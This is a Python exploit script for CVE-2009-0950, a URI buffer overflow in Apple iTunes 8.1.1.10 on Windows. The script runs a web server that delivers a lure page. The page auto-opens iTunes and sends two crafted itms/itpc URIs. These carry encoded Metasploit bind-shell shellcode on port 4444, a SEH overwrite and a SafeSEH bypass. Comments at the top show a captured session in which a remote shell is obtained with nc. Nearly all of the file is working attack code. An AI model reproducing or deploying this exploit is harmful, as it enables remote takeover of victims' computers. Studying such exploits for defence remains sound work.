#!/usr/bin/python
# Apple iTunes 8.1.1.10 itms/itcp BOF Windows Exploit
# www.offensive-security.com/blog/vulndev/itunes-exploitation-case-study/
# Matteo Memelli | ryujin __A-T__ offensive-security.com
# Spaghetti & Pwnsauce - 06/10/2009 
# CVE-2009-0950 http://dvlabs.tippingpoint.com/advisory/TPTI-09-03
#
# Vulnerability can't be exploited simply overwriting a return address on the
# stack because of stack  canary protection. Increasing buffer  size leads to
# SEH overwrite but it seems that the Access Violation needed to get  our own
# Exception Handler called is not always thrown.
# So, to increase reliability, the exploit sends two URI to iTunes:
# - the 1st payload corrupts the stack (it doesnt overwrite cookie, no crash)
# - the 2nd payload fully overwrite SEH to 0wN EIP
# Payloads must be encoded in order to obtain pure ASCII printable shellcode.
# I could trigger the  vulnerability from  Firefox but not from IE that seems
# to truncate the long URI.
# Tested on Windows XP SP2/SP3 English, Firefox 3.0.10, 
# iTunes 8.1.1.10, 8.1.0.52
#
# --> hola hola ziplock, my Apple Guru! ;) && cheers to muts... he knows why
#
# ryujin:Desktop ryujin$ ./ipwn.py 
# [+] iTunes 8.1.10 URI Bof Exploit Windows Version CVE-2009-0950
# [+] Matteo Memelli aka ryujin __A-T__ offensive-security.com
# [+] www.offensive-security.com
# [+] Spaghetti & Pwnsauce
# [+] Listening on port 80
# [+] Connection accepted from: 172.16.30.7
# [+] Payload sent, wait 20 secs for iTunes error!
# ryujin:Desktop ryujin$ nc -v 172.16.30.7 4444
# Connection to 172.16.30.7 4444 port [tcp/krb524] succeeded!
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Program Files\Mozilla Firefox> 

from socket import *

html = """
<html>
  <head><title>iTunes loading . . .</title>
  <script>
   function openiTunes(){document.location.assign("itms://itunes.apple.com/");}
   function prepareStack(){document.location.assign("%s");}
   function ownSeh(){document.location.assign("%s");}
   function ipwn(){
    prepareStack();
    ownSeh();
   }
   function main() {
    openiTunes();
    // Increase this timeout if your iTunes takes more time to load!
    setTimeout('ipwn()',20000);
   }
  </script>
  </head>
  <body onload="main();">
    <p align="center">
    <b>iTunes 8.1.1.10 URI Bof Exploit Windows Version CVE-2009-0950</b>
    </p>
    <p align="center"><b>ryujin __ A-T __ offensive-security.com</b></p>
    <p align="center"><b>www.offensive-security.com</b></p>
    <p align="center">
    iTunes starting... wait for 20 secs; if you get an error, click "Ok"
    in the MessageBox before checking for your shell on port 4444 :)<br/>
    If victim host is not connected to the internet, exploit will fail
    unless iTunes is already opened and you disable "openiTunes" javascript
    function.
    <br/>
    <h2 align="center">
    <b><u>This exploit works if opened from Firefox not from IE!</u></b>
    </h2>
    <p align="center">
    After exploitation iTunes crashes, you need to kill it from TaskManager
    <br/>have fun!</br>
    </p>
    </p>
  </body>
</html>"""

# Alpha2 ASCII  printable  Shellcode  730 Bytes, via  EDX (0x60,0x40 Badchar)
# This is not standard Alpha2 bind shell. Beginning of shellcode  is modified
# in order to obtain register alignment and to  reset ESP and EBP we  mangled
# before. Rest of decoded shellcode is Metasploit  bind  shell  on  port 4444
# EXITFUNC=thread
# 
shellcode = ("VVVVVVVVVVVVVVVVV7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIOqhDahIoS0"
             "5QnaJLS1uQVaeQcdcm2ePESuW5susuPEsuilazJKRmixHykOkOKOCPLKPlUtu"
             "tnkRegLLKSLfepx31zOlK2o7hlKqOEpWqZK3ylKwDLKeQHndqo0j9llOt9P3D"
             "uW9Q8J4MWqkrJKkDukPTWTq845M5LKQOq4VajKcVLKTLPKlKQOUL6ajK336LL"
             "KMY0lWTwle1O3TqiK2DLKaSFPLKQPVllK0p7lLmlK3pUXQNU8LNbnvnjL0PkO"
             "8V2Fv3U61xds02U8RWpsVRqO649on0PhjkZMYlekpPKOKfsoMYkUpfna8mgxV"
             "b65RJuRIoHPPhHYFiL5lmBwkOzvpSPSV3F3bsg3BsSsScIohPsVRHR1sl2Fcc"
             "k9M1nuphOT6zppIWrwKO8VcZ6ppQv5KO8PBHmtNMvNm9QGKON6aCqEkOZpbHZ"
             "EbiNfRiSgioiFRpf40TseiohPLSu8KWD9kvPyf7YoxVqEKOxPu6sZpd3VSX1s"
             "0mK98ecZRpv9Q9ZlMYkWqzpDmYxbTqO0KCoZKNaRVMkN3r6LJ3NmpzFXNKNKL"
             "ksX0rkNls5FkOrURdioXVSk67PRPQsapQCZgqbq0QSesaKOxPaxNMZyEUjnCc"
             "KOn6qzKOkOtwKOJpNk67YlMSKtcTyozvrryozp0hXoZnYp1p0SkOXVKOHPA")
# Padding
pad0x1          = "\x41"*425

# Make EDX pointing to shellcode and "pray" sh3llcod3 M@cumBa w00t w00t
align           = "\x61"*45 + "\x54\x5A" + "\x42"*6 + "V"*10

# Padding
pad0x2          = "\x41"*570                                   

# ASCII friendly RET overwriting SEH: bye bye canary, tweet tweet
# 0x67215e2a QuickTime.qts ADD ESP,8;RETN (SafeSEH bypass)
ret             = "\x2a\x5e\x21\x67"

# Let the dance begin... Point EBP to encoded jmp                                                               
align_for_jmp   = "\x61\x45\x45\x45" + ret + "\x44" + "\x45"*7

# Decode a NEAR JMP and JUMP BACK BABY!
jmp_back        = ("UYCCCCCCIIIIIIIIII7QZjAXP0A0AkA"
                   "AQ2AB2BB0BBABXP8ABuJIZIE5jZKOKOA")
# Padding
pad0x3          = "\x43"*162                                   

# We send 2 payloads to iTunes: first is itms and second itpc
# url1 smashes the stack in order to get an AV later
url1            = "itms://:" + "\x41"*200 + "/" 
url2            = "itpc://:" + pad0x1 + align + shellcode +pad0x2 +\
                               align_for_jmp + jmp_back + pad0x3 
payload         = html % (url1, url2)

print "[+] iTunes 8.1.1.10 URI Bof Exploit Windows Version CVE-2009-0950"
print "[+] Matteo Memelli aka ryujin __A-T__ offensive-security.com"
print "[+] www.offensive-security.com"
print "[+] Spaghetti & Pwnsauce"
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 80))
s.listen(1)
print "[+] Listening on port 80"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(payload)
print "[+] Payload sent, wait 20 secs for iTunes error!"
c.close()
s.close()